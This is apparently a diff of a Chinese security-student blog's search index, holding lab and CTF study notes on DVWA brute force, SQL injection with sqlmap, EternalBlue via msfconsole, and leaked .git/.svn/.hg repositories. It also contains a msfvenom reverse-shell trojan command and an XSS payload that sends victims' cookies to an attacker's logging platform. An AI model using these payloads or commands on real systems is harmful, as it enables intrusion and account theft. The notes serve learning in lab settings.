@@ -1,10 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
+    <title>DVWA靶场练习</title>
     <url>/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<p>title: DVWA靶场练习<br>date: 2023‎-‎7‎-16‎ ‏‎16:08:34<br>tags: [DVWA, 渗透]<br>categories: [DVWA靶场练习]</p>
-<h3 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1. 爆破"></a>1. 爆破</h3><h4 id="1-四种爆破模式"><a href="#1-四种爆破模式" class="headerlink" title="1. 四种爆破模式"></a>1. 四种爆破模式</h4><p>单字典(只有一个字典)<br>1.Sniper：按顺序一个一个参数依次遍历，一个参数遍历完，然后恢复成原数据，再遍历下一个参数。<br>2.Battering ram：每个参数同时遍历同一个字典。但是这种爆破在实际过程中是很不合理的，应为基本不会有人将用户名和密码设置成一样的，就像大多数人不会将qq密码设置成qq号一样。</p>
+    <content><![CDATA[<h3 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1. 爆破"></a>1. 爆破</h3><h4 id="1-四种爆破模式"><a href="#1-四种爆破模式" class="headerlink" title="1. 四种爆破模式"></a>1. 四种爆破模式</h4><p>单字典(只有一个字典)<br>1.Sniper：按顺序一个一个参数依次遍历，一个参数遍历完，然后恢复成原数据，再遍历下一个参数。<br>2.Battering ram：每个参数同时遍历同一个字典。但是这种爆破在实际过程中是很不合理的，应为基本不会有人将用户名和密码设置成一样的，就像大多数人不会将qq密码设置成qq号一样。</p>
 <p>一个相当于单挑，一个相当于群殴。</p>
 <span id="more"></span>
 
@@ -31,6 +30,13 @@
 <p>成功</p>
 <h4 id="2-medium"><a href="#2-medium" class="headerlink" title="2. medium"></a>2. medium</h4><p>和初级一样，爆破速度太慢的话可以尝试提高线程数</p>
 <h4 id="3-high"><a href="#3-high" class="headerlink" title="3. high"></a>3. high</h4>]]></content>
+      <categories>
+        <category>DVWA靶场练习</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+        <tag>渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>HTML学习</title>
@@ -118,10 +124,9 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>LANMP靶场搭建</title>
     <url>/2023/10/13/LANMP%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>title: LANMP靶场搭建<br>date: ‎2023-7‎-‎15‎ 16:46:03<br>tags: [LANMP靶场]<br>categories: [LANMP靶场搭建]</p>
-<h4 id="1-LANMP的简介"><a href="#1-LANMP的简介" class="headerlink" title="1. LANMP的简介"></a>1. LANMP的简介</h4><ul>
+    <content><![CDATA[<h4 id="1-LANMP的简介"><a href="#1-LANMP的简介" class="headerlink" title="1. LANMP的简介"></a>1. LANMP的简介</h4><ul>
 <li>L：Linux</li>
 <li>A：Apache</li>
 <li>N：Nginx</li>
@@ -139,12 +144,17 @@
 <p>启动apache：sudo service apache2 start<br>启动mysql：sudo service mysql start</p>
 <p>可以通过 service MySQL&#x2F;apache2 status命令查看启动情况</p>
 <h4 id="4-KALI在LAMP下搭建DVWA靶场"><a href="#4-KALI在LAMP下搭建DVWA靶场" class="headerlink" title="4. KALI在LAMP下搭建DVWA靶场"></a>4. KALI在LAMP下搭建DVWA靶场</h4>]]></content>
+      <categories>
+        <category>LANMP靶场搭建</category>
+      </categories>
+      <tags>
+        <tag>LANMP靶场</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>sql注入漏洞</title>
     <url>/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>title: sql注入漏洞<br>date: ‎2023-7‎-‎12‎ 9:56:03<br>tags: [sql注入]<br>categories: [sql注入]</p>
-<h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1. SQL注入"></a>1. SQL注入</h3><h4 id="1-SQL注入-low"><a href="#1-SQL注入-low" class="headerlink" title="1. SQL注入 low"></a>1. SQL注入 low</h4><span id="more"></span>
+    <content><![CDATA[<h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1. SQL注入"></a>1. SQL注入</h3><h4 id="1-SQL注入-low"><a href="#1-SQL注入-low" class="headerlink" title="1. SQL注入 low"></a>1. SQL注入 low</h4><span id="more"></span>
 
 <h5 id="1）认识"><a href="#1）认识" class="headerlink" title="1）认识"></a>1）认识</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="comment">// Check database</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span></span><br><span class="line">            <span class="comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -210,12 +220,38 @@
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot; -D dvwa -T users -dump</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/13/css%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<p>title: css入门<br>date: 2023-6-26 18:56:41<br>tags: [css快速入门]<br>categories: [css入门]</p>
-<h3 id="三种方式添加CSS"><a href="#三种方式添加CSS" class="headerlink" title="三种方式添加CSS"></a>三种方式添加CSS</h3><ul>
+    <title>msfconsole使用永恒之蓝获取win7命令行</title>
+    <url>/2023/10/13/msfconsole%E4%BD%BF%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%8E%B7%E5%8F%96win7%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
+    <content><![CDATA[<p>打开kali进root权限</p>
+<p>命令行msfconsole（msf工具的一个接口）</p>
+<p>search ms17_010（找永恒之蓝漏洞）</p>
+<p>ues:  use 0</p>
+<p>set:  设置相关参数,源Ip(默认配好的),目标靶机ip、端口号（默认就行）</p>
+<p>run</p>
+<p>完成</p>
+<span id="more"></span>
+
+]]></content>
+      <categories>
+        <category>msfconsole</category>
+      </categories>
+      <tags>
+        <tag>永恒之蓝利用</tag>
+        <tag>msfconsole</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>css入门</title>
+    <url>/2023/06/26/css%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h3 id="三种方式添加CSS"><a href="#三种方式添加CSS" class="headerlink" title="三种方式添加CSS"></a>三种方式添加CSS</h3><ul>
 <li>外部样式表：最常用，一般表示在外部的.CSS文件中，在HTML文件中使用<link>标签进行引用</li>
 <li>内部样式表：可用，不使用外部单独的.CSS文件，将CSS属性放在HTML文件head标签中的style属性中</li>
 <li>内联样式：一般不用，仅影响一个单独的元素，在HTML元素的style属性中添加</li>
@@ -223,10 +259,16 @@
 <span id="more"></span>
 
 <h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>在html的head部分使用style标签进行设置</p>
-<p><img src="/2023/10/13/css%E5%85%A5%E9%97%A8/image-20230630193157172.png" alt="image-20230630193157172"></p>
+<p><img src="/2023/06/26/css%E5%85%A5%E9%97%A8/image-20230630193157172.png" alt="image-20230630193157172"></p>
 <h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>在具体的标签中设置style属性</p>
-<p><img src="/2023/10/13/css%E5%85%A5%E9%97%A8/image-20230630193303966.png" alt="image-20230630193303966"></p>
+<p><img src="/2023/06/26/css%E5%85%A5%E9%97%A8/image-20230630193303966.png" alt="image-20230630193303966"></p>
 <h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4>]]></content>
+      <categories>
+        <category>css入门</category>
+      </categories>
+      <tags>
+        <tag>css快速入门</tag>
+      </tags>
   </entry>
   <entry>
     <title>Hello World</title>
@@ -284,32 +326,21 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>msfconsole针对windows生成exe木马</title>
     <url>/2023/10/13/msfvenom%E9%92%88%E5%AF%B9windows%E7%94%9F%E6%88%90exe%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<p>title: msfconsole针对windows生成exe木马<br>date: ‎2023‎-5‎-‎31‎ ‏‎20:28:21<br>tags: [msfconsole]<br>categories: [msfconsole]</p>
-<p>msfvenom -p(payload,负载选项)  windows&#x2F;x64&#x2F;merterpreter&#x2F;reverse_tcp lhost &#x3D; 本机IP lport &#x3D; 本机端口（随便）-f(生成什么形式的文件) exe -o(输出) demo.exe</p>
+    <content><![CDATA[<p>msfvenom -p(payload,负载选项)  windows&#x2F;x64&#x2F;merterpreter&#x2F;reverse_tcp lhost &#x3D; 本机IP lport &#x3D; 本机端口（随便）-f(生成什么形式的文件) exe -o(输出) demo.exe</p>
 ]]></content>
+      <categories>
+        <category>msfconsole</category>
+      </categories>
+      <tags>
+        <tag>msfconsole</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/13/msfconsole%E4%BD%BF%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%8E%B7%E5%8F%96win7%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
-    <content><![CDATA[<p>title: msfconsole使用永恒之蓝获取win7命令行<br>date: ‎2023‎-‎5‎-‎31‎ ‏‎20:27:52<br>tags: [永恒之蓝利用, msfconsole]<br>categories: [msfconsole]</p>
-<p>打开kali进root权限</p>
-<p>命令行msfconsole（msf工具的一个接口）</p>
-<p>search ms17_010（找永恒之蓝漏洞）</p>
-<p>ues:  use 0</p>
-<p>set:  设置相关参数,源Ip(默认配好的),目标靶机ip、端口号（默认就行）</p>
-<p>run</p>
-<p>完成</p>
-<span id="more"></span>
-
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
+    <title>php学习记录</title>
     <url>/2023/10/13/php%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>title: php学习记录<br>date: 2023‎-‎9‎-‎6‎ ‏‎21:48:46<br>tags: [php]<br>categories: [php]</p>
-<h1 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1. 基础语法"></a>1. 基础语法</h1><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
+    <content><![CDATA[<h1 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1. 基础语法"></a>1. 基础语法</h1><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
 <li><p>PHP 文件的默认扩展名是 “.php”</p>
 </li>
 <li><p>PHP 文件中可以包含 <code>html</code>、<code>CSS</code>、<code>JavaScript</code> 代码</p>
@@ -395,12 +426,17 @@
 
 
 ]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>Spring学习</title>
     <url>/2023/09/24/spring/</url>
-    <content><![CDATA[<p>title: Spring学习<br>date: ‎2023‎-9‎-‎24‎ 15:19:38<br>tags: [java开发，Spring]<br>categories: [java开发]</p>
-<h3 id="1-什么是Spring"><a href="#1-什么是Spring" class="headerlink" title="1. 什么是Spring"></a>1. 什么是Spring</h3><p>一个轻量级的控制反转（IOC）和面向切面（AOP）的框架</p>
+    <content><![CDATA[<h3 id="1-什么是Spring"><a href="#1-什么是Spring" class="headerlink" title="1. 什么是Spring"></a>1. 什么是Spring</h3><p>一个轻量级的控制反转（IOC）和面向切面（AOP）的框架</p>
 <ul>
 <li>一个开源的免费框架（容器）</li>
 <li>轻量级、非入侵式的框架</li>
@@ -542,15 +578,18 @@
 <p>四个注解（加上@Component）的功能是一样的，都是将某个类注册到spring中，并进行装配</p>
 <h4 id="4-singleton-“xxx”"><a href="#4-singleton-“xxx”" class="headerlink" title="4. @singleton(“xxx”)"></a>4. @singleton(“xxx”)</h4><p>相当于scope&#x3D;”singleton”</p>
 ]]></content>
+      <categories>
+        <category>java开发</category>
+      </categories>
+      <tags>
+        <tag>java开发，Spring</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/</url>
-    <content><![CDATA[<p>title: ctfhub刷题心得<br>date: 2023-9-25 21:56:41<br>tags: [ctfhub, ctf]<br>categories: [ctfhhub刷题]</p>
-<h1 id="1-web"><a href="#1-web" class="headerlink" title="1. web"></a>1. web</h1><h2 id="1-前置技能"><a href="#1-前置技能" class="headerlink" title="1. 前置技能"></a>1. 前置技能</h2><h3 id="1-http协议"><a href="#1-http协议" class="headerlink" title="1. http协议"></a>1. http协议</h3><h4 id="1-请求方式"><a href="#1-请求方式" class="headerlink" title="1. 请求方式"></a>1. 请求方式</h4><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
+    <title>ctfhub刷题心得</title>
+    <url>/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<h1 id="1-web"><a href="#1-web" class="headerlink" title="1. web"></a>1. web</h1><h2 id="1-前置技能"><a href="#1-前置技能" class="headerlink" title="1. 前置技能"></a>1. 前置技能</h2><h3 id="1-http协议"><a href="#1-http协议" class="headerlink" title="1. http协议"></a>1. http协议</h3><h4 id="1-请求方式"><a href="#1-请求方式" class="headerlink" title="1. 请求方式"></a>1. 请求方式</h4><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
 <span id="more"></span>
-
-
 
 <h4 id="2-302跳转"><a href="#2-302跳转" class="headerlink" title="2. 302跳转"></a>2. 302跳转</h4><p>301跳转是指页面永久性移走(永久跳转)，通常叫做301跳转，也叫 301重定向 ，301转向。301跳转多用于旧网址在废弃前转向新网址以保证用户的访问，在诸多服务器中，均支持本跳转方法。</p>
 <p>302重定向又称之为暂时性转移(临时跳转)，英文名称：302 redirect。 也被认为是暂时重定向 ，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。</p>
@@ -558,26 +597,26 @@
 <li>比如一个portal页面，换了新的域名，但是老的域名地址还有很多用户在使用，这样可以对老域名配置302跳转到新域名地址，保证服务的延续。</li>
 <li>另外对于一些客户端预埋的Url链接，免不了老版本地址失效与更改，将老地址配置302跳转到新地址，这样就能够全面兼容所有客户端版本。</li>
 </ul>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png" alt="image-20230722195004196"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png" alt="image-20230722195004196"></p>
 <h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><h1 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a>2. 信息泄露</h1><h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1. 目录遍历"></a>1. 目录遍历</h2><h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2. phpinfo"></a>2. phpinfo</h2><h2 id="3-备份文件下载"><a href="#3-备份文件下载" class="headerlink" title="3. 备份文件下载"></a>3. 备份文件下载</h2><h3 id="1-网站源码"><a href="#1-网站源码" class="headerlink" title="1. 网站源码"></a>1. 网站源码</h3><h3 id="2-bak文件"><a href="#2-bak文件" class="headerlink" title="2. bak文件"></a>2. bak文件</h3><h3 id="3-vim缓存"><a href="#3-vim缓存" class="headerlink" title="3. vim缓存"></a>3. vim缓存</h3><p>当我们使用vim或者vi编辑文件时，出现不正常的情况（多个程序编辑同一个文件），系统会产生一个.(flilename).swp文件，我们在网站中访问该文件，便可以拿到网站的源码</p>
 <h3 id="4-DS-Store"><a href="#4-DS-Store" class="headerlink" title="4. .DS_Store"></a>4. .DS_Store</h3><h3 id="4-git"><a href="#4-git" class="headerlink" title="4. git"></a>4. git</h3><h4 id="1-log"><a href="#1-log" class="headerlink" title="1. log"></a>1. log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724101810666.png" alt="image-20230724101810666"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724101810666.png" alt="image-20230724101810666"></p>
 <p>没做出来，呜呜呜</p>
 <h3 id="5-svn泄露"><a href="#5-svn泄露" class="headerlink" title="5. svn泄露"></a>5. svn泄露</h3><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
 <p>我们也需要使用一个工具来利用svn泄露——dvcs-ripper，安装教程：<a href="https://blog.csdn.net/Barlow_121212/article/details/120491567">(22条消息) dvcs-ripper安装教程_海滩丨长颈鹿的博客-CSDN博客</a></p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141207580.png" alt="image-20230724141207580"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141207580.png" alt="image-20230724141207580"></p>
 <p>执行命令</p>
-<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141119351.png" alt="image-20230724141119351" style="zoom:150%;">
+<img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141119351.png" alt="image-20230724141119351" style="zoom:150%;">
 
 <p>查看到flag</p>
 <h3 id="6-hg泄露"><a href="#6-hg泄露" class="headerlink" title="6. hg泄露"></a>6. hg泄露</h3><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞</p>
-<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142806792.png" alt="image-20230724142806792" style="zoom:150%;">
+<img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142806792.png" alt="image-20230724142806792" style="zoom:150%;">
 
 <p>执行命令</p>
-<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142857455.png" alt="image-20230724142857455" style="zoom:150%;">
+<img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142857455.png" alt="image-20230724142857455" style="zoom:150%;">
 
 <p>找到一个类似的flag文件，但是我在下载下的文件夹里翻半天也没发现，那我直接尝试使用该文件直接在网站访问</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724143057762.png" alt="image-20230724143057762"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724143057762.png" alt="image-20230724143057762"></p>
 <p>成功找到</p>
 <h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><h3 id="1-整数型注入"><a href="#1-整数型注入" class="headerlink" title="1. 整数型注入"></a>1. 整数型注入</h3><p>除了手工注入外，我们还可以使用sqlmap这个渗透工具。<a href="https://sqlmap.org/">sqlmap是一款开源的渗透测试工具，它可以自动化地检测和利用SQL注入漏洞，从而获取数据库服务器的控制权。</a>通过具体的使用，其使用确实要比手工注入要更方便快捷，使用–current-db，–tables，–columns等几个命令便可以较为简单的拿到数据库的有关信息。</p>
 <p>在手工注入中，我们需要知道几个信息，MySQL的数据库中一般都会有一个information_schema这样的一个数据库，其中一般都会存放一些关于mysql数据库的相关信息。我们可以从其中的tables，columns表中找到我们想要的表名和列名。</p>
@@ -605,11 +644,11 @@
 <li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
 <li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
 </ul>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195417378.png" alt="image-20230807195417378"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195417378.png" alt="image-20230807195417378"></p>
 <p>当我们输入1时，没有任何问题，成功查询</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195508562.png" alt="image-20230807195508562"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195508562.png" alt="image-20230807195508562"></p>
 <p>出现报错信息，可以使用报错注入</p>
-<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195745003.png" alt="image-20230807195745003"></p>
+<p><img src="/2023/09/25/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195745003.png" alt="image-20230807195745003"></p>
 <p>拿到了数据库的名称</p>
 <h1 id="4-XSS"><a href="#4-XSS" class="headerlink" title="4. XSS"></a>4. XSS</h1><p>1、明确cookie的作用<br>当你登录账号密码，服务端就会给你一个cookie，这样你在这个平台上的操作就带上了cookie来验证身份，而不用每一次操作都要你登录账号密码。cookie相当于每个人的登录凭证，如果得到了别人的cookie，特别是管理员的，我们将可以不用输账号密码，直接登录，从而获取管理员权限。</p>
 <p>2、XSS的目的<br>获取别人的cookie。<br>Web渗透测试之XSS攻击：反射型XSS</p>
@@ -618,73 +657,73 @@
 <p>①在存在XSS漏洞的地方加上XSS：<script src=“<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D">http://127.0.0.1/xss/UYxzH8?1608472710/”</a> + document.cookie;> </script> (<a href="http://127.0.0.1/xss/UYxzH8?1608472710/">http://127.0.0.1/xss/UYxzH8?1608472710/</a> 为我们搭建的XSS平台)。</p>
 <p>②接着构造虚假URL诱使受害用户点击：<a href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> 。就像上面那个蓝字链接，我诱使你们点击，然后你们的浏览器就会请求蓝字背后的链接。如果我把蓝字背后的链接换成<a href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> ，在你们点击后，你们的浏览器就会带上你们的cookie，访问<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%9C%A8%E6%88%91%E6%89%80%E6%90%AD%E5%BB%BA%E7%9A%84%E5%B9%B3%E5%8F%B0%E6%97%A5%E5%BF%97%E4%B8%8A%E7%95%99%E4%B8%8B%E4%BD%A0%E4%BB%AC%E7%9A%84cookie%E3%80%82">http://127.0.0.1/xss/UYxzH8?1608472710/，从而在我所搭建的平台日志上留下你们的cookie。</a></p>
 <p>③在用户点击后，只需查看我们所搭建平台的日志即可获得受害用户的cookie。在获得cookie之后就可以利用抓包工具修改请求包中的cookie，将其替换为受害用户的cookie即可登录受害用户的账号。而诱使用户点击虚假URL的方式有很多，如钓鱼邮件、特殊的图片或文本等。</p>
-<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/Users\AJNUY\AppData\Roaming\Typora\typora-user-images\image-20230818175801011.png" alt="image-20230818175801011"></p>
